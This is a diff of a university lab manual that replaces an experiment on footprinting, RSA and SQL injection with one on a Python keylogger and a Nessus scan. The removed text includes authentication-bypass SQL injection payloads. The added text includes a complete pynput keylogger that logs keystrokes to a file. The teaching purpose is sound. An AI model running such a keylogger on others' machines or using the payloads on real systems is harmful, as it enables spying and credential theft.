@@ -1,15 +1,15 @@
-# Experiment 2
-# Attacks and Countermeasures: Footprinting, RSA Cryptography and SQL Injection
+# Experiment 3
+# Web Server Vulnerabilities and Exploitation: Python Keylogger Demonstration and Nessus Vulnerability Assessment
 
 ## Aim
 
-To understand information gathering techniques, demonstrate RSA encryption and decryption, and study SQL Injection attacks in a controlled environment while learning appropriate security countermeasures.
+To understand web server vulnerabilities, demonstrate the working of a basic Python keylogger in a controlled environment, and perform vulnerability assessment using Nessus Essentials.
 
 ---
 
 ## Course Outcome Mapping
 
-**CO2:** Conduct a web security attack and demonstration of attack detection techniques.
+**CO3:** Measure the performance and troubleshoot cyber security systems.
 
 ---
 
@@ -17,140 +17,98 @@ To understand information gathering techniques, demonstrate RSA encryption and d
 
 Students should be familiar with:
 
+- Operating System Basics
 - Computer Networks
-- TCP/IP Protocol Suite
-- HTTP and HTTPS
-- Basic Database Concepts
-- SQL Queries
-- Web Applications
-- Basic Cryptography Concepts
+- Python Programming
+- Client-Server Architecture
+- Web Servers
+- Basic Cyber Security Concepts
 
 ---
 
 # Theory
 
-Ethical hackers collect information about target systems before attempting any security assessment. This process is called **Footprinting** or **Reconnaissance**. Once sufficient information is collected, vulnerabilities are identified and verified in an authorized environment.
+A web server provides services to clients over HTTP or HTTPS. Improper configuration, outdated software, weak authentication mechanisms, and unpatched vulnerabilities make web servers attractive targets for attackers.
 
-Security professionals also use cryptographic techniques to protect sensitive information. One of the most widely used public-key cryptographic algorithms is **RSA**, which provides confidentiality and secure communication.
+Before exploitation, security professionals perform **Vulnerability Assessment** to identify security weaknesses without exploiting them.
 
-Modern web applications are highly dependent on databases. Improper validation of user input may lead to **SQL Injection**, allowing attackers to manipulate database queries. Understanding these attacks helps security professionals design secure applications.
+This experiment introduces two important concepts:
 
----
+- Educational demonstration of a Python Keylogger
+- Vulnerability Assessment using Nessus Essentials
 
-# Part A – Footprinting and Reconnaissance
-
-Footprinting is the process of collecting publicly available information about a target organization.
-
-Information gathered may include:
-
-- Domain Name
-- IP Address
-- DNS Records
-- Email Addresses
-- Technologies Used
-- Web Server Information
-- Network Information
-
-Footprinting can be classified into:
-
-### Passive Footprinting
-
-Information is collected without directly interacting with the target.
-
-Examples:
-
-- Search Engines
-- WHOIS Lookup
-- DNS Records
-- Public Websites
-
-### Active Footprinting
-
-Information is collected by directly communicating with the target.
-
-Examples:
-
-- Port Scanning
-- Network Scanning
-- Banner Grabbing
-- Service Enumeration
+> **Important:** This experiment is intended **only for educational purposes** inside an authorized laboratory environment.
 
 ---
 
-# Part B – RSA Cryptography
+# Part A – Web Server Vulnerabilities
 
-RSA is an asymmetric encryption algorithm that uses two keys:
+Common web server vulnerabilities include:
 
-- Public Key
-- Private Key
+- Outdated Software
+- Default Credentials
+- Weak Password Policies
+- Missing Security Updates
+- Directory Listing Enabled
+- Improper File Permissions
+- SQL Injection
+- Cross Site Scripting (XSS)
+- Insecure HTTP Configuration
 
-The Public Key is used for encryption, while the Private Key is used for decryption.
-
-### Advantages
-
-- Secure communication
-- Digital Signatures
-- Authentication
-- Confidentiality
-
-Applications include:
-
-- HTTPS
-- Secure Email
-- VPN
-- Digital Certificates
+These vulnerabilities are identified during security assessments before deploying proper countermeasures.
 
 ---
 
-# Part C – SQL Injection
+# Part B – Keylogger
 
-SQL Injection is one of the most common web application attacks.
+A keylogger is software that records keyboard input.
 
-It occurs when user input is directly included in SQL queries without proper validation.
+Attackers may misuse keyloggers to steal sensitive information. Ethical hackers and security professionals study their working to understand detection mechanisms and improve endpoint security.
 
-Example of vulnerable query:
+Typical workflow:
 
-```sql
-SELECT * FROM users
-WHERE username='admin'
-AND password='password';
+```
+Keyboard Input
+       │
+       ▼
+Capture Keystrokes
+       │
+       ▼
+Store in Log File
+       │
+       ▼
+Security Analysis
 ```
 
-If input validation is absent, an attacker may manipulate the SQL query.
-
-Example:
-
-```text
-' OR '1'='1
-```
-
-This may modify the original query and bypass authentication in intentionally vulnerable applications.
-
 ---
 
-# SQL Injection Prevention
+# Part C – Nessus Vulnerability Assessment
 
-Common countermeasures include:
+Nessus Essentials is a vulnerability assessment tool used to identify security weaknesses in systems and networks.
 
-- Parameterized Queries (Prepared Statements)
-- Input Validation
-- Stored Procedures
-- Least Privilege Principle
-- Web Application Firewall (WAF)
-- Proper Error Handling
+It performs checks such as:
+
+- Missing Security Updates
+- Weak Configurations
+- Open Ports
+- Vulnerable Services
+- SSL/TLS Issues
+- Operating System Detection
+
+Unlike penetration testing tools, Nessus identifies vulnerabilities without exploiting them.
 
 ---
 
 # Practical Scenario
 
-You are working as a Cyber Security Analyst.
+You are working as a Security Analyst.
 
 The organization has requested you to:
 
-- Collect publicly available information about a target domain.
-- Demonstrate RSA encryption and decryption.
-- Study SQL Injection using a vulnerable web application.
-- Recommend appropriate security countermeasures.
+- Demonstrate how a basic keylogger works in a controlled environment.
+- Scan a laboratory system using Nessus.
+- Analyze detected vulnerabilities.
+- Recommend mitigation techniques.
 
 ---
 
@@ -158,188 +116,158 @@ The organization has requested you to:
 
 | Tool | Purpose |
 |------|---------|
-| Kali Linux | Penetration Testing Environment |
-| whois | Domain Information |
-| nslookup / dig | DNS Enumeration |
-| theHarvester (Optional) | Email & Subdomain Discovery |
-| Python 3 | RSA Demonstration |
-| SQLite / MySQL | Database |
-| XAMPP / Apache | Web Server |
-| DVWA (Damn Vulnerable Web Application) or bWAPP | SQL Injection Practice |
-
-> **Note:** Perform all experiments only in an authorized laboratory environment or virtual machine.
+| Python 3 | Keylogger Demonstration |
+| pynput Library | Keyboard Event Capture |
+| Nessus Essentials | Vulnerability Assessment |
+| Windows / Linux VM | Target Machine |
 
 ---
 
 # Procedure
 
-## Activity 1 – Footprinting and Reconnaissance
+## Activity 1 – Create a Simple Python Keylogger
 
 ### Tool Used
 
-- WHOIS
-- nslookup
-- dig (Linux)
-- theHarvester (Optional)
-
-### Steps
-
-Display domain registration information.
-
-```bash
-whois example.com
-```
-
-Retrieve DNS records.
-
-```bash
-nslookup example.com
-```
-
-OR
-
-```bash
-dig example.com
-```
-
-(Optional)
-
-Collect publicly available email addresses.
-
-```bash
-theHarvester -d example.com -b bing
-```
-
-### Expected Output
-
-Students should observe:
-
-- Domain Registrar
-- Name Servers
-- IP Address
-- DNS Records
-- Public Email Addresses (if available)
-- Subdomains (if available)
-
----
-
-## Activity 2 – RSA Encryption and Decryption
-
-### Tool Used
-
-Python 3
+- Python 3
+- pynput Library
 
 ### Install Required Package
 
 ```bash
-pip install rsa
+pip install pynput
 ```
 
 ### Sample Program
 
 ```python
-import rsa
+from pynput import keyboard
 
-public_key, private_key = rsa.newkeys(512)
+log_file = "keystrokes.txt"
 
-message = "Ethical Hacking Lab"
+def on_press(key):
+    try:
+        with open(log_file, "a") as file:
+            file.write(key.char)
+    except AttributeError:
+        with open(log_file, "a") as file:
+            file.write(f"[{key}]")
 
-encrypted = rsa.encrypt(message.encode(), public_key)
+def on_release(key):
+    if key == keyboard.Key.esc:
+        return False
 
-print("Encrypted Message:")
-print(encrypted)
-
-decrypted = rsa.decrypt(encrypted, private_key)
-
-print("Decrypted Message:")
-print(decrypted.decode())
+with keyboard.Listener(
+        on_press=on_press,
+        on_release=on_release) as listener:
+    listener.join()
 ```
-
-### Expected Output
-
-Students should observe:
-
-- Public Key Generated
-- Private Key Generated
-- Encrypted Message
-- Successfully Decrypted Original Message
-
----
-
-## Activity 3 – SQL Injection Demonstration
-
-### Tool Used
-
-DVWA (or bWAPP)
 
 ### Steps
 
-Start Apache and MySQL.
-
-Open DVWA.
-
-Navigate to:
-
-```
-SQL Injection
-```
-
-Enter a normal input.
-
-Example:
-
-```
-ID = 1
-```
-
-Observe the result.
-
-Now try an SQL Injection payload.
-
-Example:
-
-```text
-1' OR '1'='1
-```
-
-Observe how the application responds.
-
-> **Note:** Perform SQL Injection only on intentionally vulnerable applications provided for educational purposes.
+1. Save the program.
+2. Execute the script.
+3. Type sample text.
+4. Press **Esc** to stop logging.
+5. Open the generated `keystrokes.txt` file.
 
 ### Expected Output
 
 Students should observe:
 
-- Database Records Returned
-- Modified SQL Query Behavior
-- Vulnerability Demonstration
+- Keystrokes captured.
+- Log file created.
+- Special keys recorded.
+
+> **Note:** Run the program only on your own laboratory machine for educational purposes.
 
 ---
 
-## Activity 4 – Study of SQL Injection Countermeasures
+## Activity 2 – Install Nessus Essentials
 
-Study how prepared statements prevent SQL Injection.
+### Steps
 
-### Vulnerable PHP Code
-
-```php
-$query = "SELECT * FROM users WHERE id = '$id'";
-```
-
-### Secure PHP Code
-
-```php
-$stmt = $conn->prepare("SELECT * FROM users WHERE id = ?");
-$stmt->bind_param("i", $id);
-```
+1. Download Nessus Essentials.
+2. Install the software.
+3. Register using an activation code.
+4. Wait for plugin updates.
+5. Open the Nessus web interface.
 
 ### Expected Output
 
-Students should understand:
+Students should observe:
 
-- Difference between vulnerable and secure queries.
-- Importance of parameterized statements.
-- Prevention of SQL Injection attacks.
+- Nessus Dashboard
+- Available Scan Templates
+
+---
+
+## Activity 3 – Perform Basic Vulnerability Scan
+
+### Tool Used
+
+Nessus Essentials
+
+### Steps
+
+1. Create a **Basic Network Scan**.
+2. Enter the target IP address.
+
+Example:
+
+```
+192.168.1.10
+```
+
+3. Save the scan.
+4. Start scanning.
+5. Wait for completion.
+
+### Expected Output
+
+Students should observe:
+
+- Target Host
+- Open Ports
+- Running Services
+- Vulnerability Count
+
+---
+
+## Activity 4 – Analyze Scan Report
+
+Open the completed scan report.
+
+Observe:
+
+- Critical Vulnerabilities
+- High Severity Issues
+- Medium Severity Issues
+- Low Severity Issues
+- Informational Findings
+
+Record the following information.
+
+| Severity | Count |
+|----------|------|
+| Critical | |
+| High | |
+| Medium | |
+| Low | |
+| Info | |
+
+---
+
+## Activity 5 – Study Recommended Solutions
+
+For each detected vulnerability, observe:
+
+- Description
+- Risk Level
+- CVE (if available)
+- Recommended Fix
+
+Prepare a summary of the mitigation techniques.
 
 ---
 
@@ -347,12 +275,11 @@ Students should understand:
 
 | Activity | Tool Used | Observation |
 |-----------|-----------|-------------|
-| Footprinting | WHOIS / nslookup | |
-| DNS Enumeration | nslookup / dig | |
-| RSA Encryption | Python | |
-| RSA Decryption | Python | |
-| SQL Injection | DVWA / bWAPP | |
-| SQL Injection Prevention | Prepared Statements | |
+| Keylogger Demonstration | Python | |
+| Vulnerability Scan | Nessus | |
+| Open Ports | Nessus | |
+| Vulnerabilities Identified | Nessus | |
+| Recommended Fixes | Nessus | |
 
 ---
 
@@ -360,47 +287,45 @@ Students should understand:
 
 | Activity | Tool | Purpose |
 |----------|------|---------|
-| Footprinting | WHOIS | Domain Information Gathering |
-| DNS Enumeration | nslookup / dig | Retrieve DNS Records |
-| Reconnaissance | theHarvester | Email and Subdomain Discovery |
-| Cryptography | Python RSA | Encryption and Decryption |
-| SQL Injection | DVWA | Study Web Vulnerability |
-| Countermeasures | Prepared Statements | Prevent SQL Injection |
+| Keylogger Demonstration | Python | Understand keyboard event logging |
+| Vulnerability Assessment | Nessus | Identify security weaknesses |
+| Risk Analysis | Nessus | Classify vulnerabilities |
+| Mitigation | Nessus Report | Recommend security improvements |
 
 ---
 
 # Result
 
-Information gathering techniques were successfully performed using footprinting tools. RSA encryption and decryption were demonstrated using Python, and SQL Injection was studied in a controlled vulnerable web application. Appropriate countermeasures for preventing SQL Injection attacks were also understood.
+A basic Python keylogger was demonstrated in a controlled laboratory environment to understand how keyboard events can be captured. A vulnerability assessment was successfully performed using Nessus Essentials, and the identified vulnerabilities along with their recommended mitigation techniques were analyzed.
 
 ---
 
 # Precautions
 
-- Perform all activities only in an authorized laboratory environment.
-- Never perform reconnaissance on unauthorized targets.
-- Conduct SQL Injection only on intentionally vulnerable applications.
-- Use virtual machines whenever possible.
-- Never attack production servers.
-- Follow ethical hacking guidelines and institutional policies.
+- Perform the experiment only in an authorized laboratory environment.
+- Execute the keylogger only on your own laboratory machine.
+- Never install or run keyloggers on systems without permission.
+- Scan only authorized hosts using Nessus.
+- Do not exploit detected vulnerabilities.
+- Follow institutional ethical hacking policies.
 
 ---
 
 # Viva Questions
 
-1. What is Footprinting?
-2. Differentiate between Passive and Active Footprinting.
-3. What information can be obtained using WHOIS?
-4. What is DNS Enumeration?
-5. What is RSA Cryptography?
-6. Differentiate between Public Key and Private Key.
-7. What is SQL Injection?
-8. Explain how SQL Injection works.
-9. What are Prepared Statements?
-10. List any four countermeasures against SQL Injection.
+1. What is a web server vulnerability?
+2. What is vulnerability assessment?
+3. Differentiate between vulnerability assessment and penetration testing.
+4. What is a keylogger?
+5. Why are keyloggers considered a security threat?
+6. What is Nessus Essentials?
+7. What are CVEs?
+8. What is CVSS?
+9. Explain different vulnerability severity levels.
+10. Why should vulnerabilities be remediated based on risk?
 
 ---
 
 # Conclusion
 
-This experiment introduced students to information gathering through footprinting and reconnaissance techniques, demonstrated RSA public-key cryptography for secure communication, and explored SQL Injection attacks in a controlled environment. Students also learned practical countermeasures to protect web applications against SQL Injection vulnerabilities.
+This experiment introduced students to common web server vulnerabilities and demonstrated the educational use of a simple Python keylogger to understand keyboard event logging. Students also performed vulnerability assessment using Nessus Essentials, analyzed security findings, and learned how vulnerability reports assist organizations in strengthening their security posture.
